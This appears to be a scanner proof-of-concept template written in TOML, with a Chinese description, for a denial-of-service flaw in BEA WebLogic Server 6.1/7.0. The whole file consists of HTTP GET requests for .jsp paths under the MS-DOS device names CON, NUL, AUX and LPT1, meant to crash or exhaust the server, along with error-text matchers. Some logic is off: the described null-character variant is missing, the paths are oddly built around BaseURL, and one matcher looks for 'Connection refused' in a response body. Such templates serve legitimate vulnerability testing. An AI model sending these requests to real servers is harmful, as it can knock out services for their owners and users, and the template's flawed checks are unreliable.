[info]
author = "AVE"
description = "通过向BEA WebLogic Server 6.1/7.0发送包含MS-DOS设备名（CON/NUL/AUX）或空字符的.JSP文件请求，触发服务器资源耗尽或进程崩溃，验证拒绝服务漏洞"
id = "POC-AVE-2002-0163"
name = "BEA WebLogic Server MS-DOS Device Name DoS PoC"
severity = "medium"
tags = ["ave-2002-0163"]
vuln_id = [
    "CVE-2002-0106",
    "AVE-2002-0163",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/CON/foo.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Error 500",
    "Internal Server Error",
    "Service Unavailable",
    "Connection refused",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/NUL/bar.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Error 500",
    "Internal Server Error",
    "Service Unavailable",
    "Connection refused",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/AUX/test.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Error 500",
    "Internal Server Error",
    "Service Unavailable",
    "Connection refused",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/LPT1/xyz.jsp"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Error 500",
    "Internal Server Error",
    "Service Unavailable",
    "Connection refused",
]
